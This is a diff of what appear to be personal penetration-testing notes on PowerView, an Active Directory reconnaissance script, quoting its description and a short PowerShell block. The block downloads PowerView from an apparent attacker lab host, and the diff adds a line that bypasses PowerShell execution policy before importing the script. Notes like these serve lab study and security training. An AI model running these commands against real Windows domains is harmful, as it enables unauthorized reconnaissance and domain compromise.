@@ -1,5 +1,7 @@
 https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
 
+![[powerview.png]]
+
 >PowerView is a PowerShell tool to gain network situational awareness on Windows domains. It contains a set of pure-PowerShell replacements for various windows net commands, which utilize PowerShell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality.
 >
 >It also implements various useful metafunctions, including some custom-written user-hunting functions which will identify where on the network specific users are logged into. It can also check which machines on the domain the current user has local administrator access on. Several functions for the enumeration and abuse of domain trusts also exist. See function descriptions for appropriate usage and available options. For detailed output of underlying functionality, pass the -Verbose or -Debug flags.
@@ -8,6 +10,8 @@ For functions that enumerate multiple machines, pass the -Verbose flag to get a 
 
 ```powershell
 Invoke-WebRequest -Uri http://10.10.14.8:8000/PowerView.ps1 -OutFile PowerView.ps1
+
+powershell -ep bypass
 
 . ./PowerView.ps1
 Import-Module .\PowerView.ps1
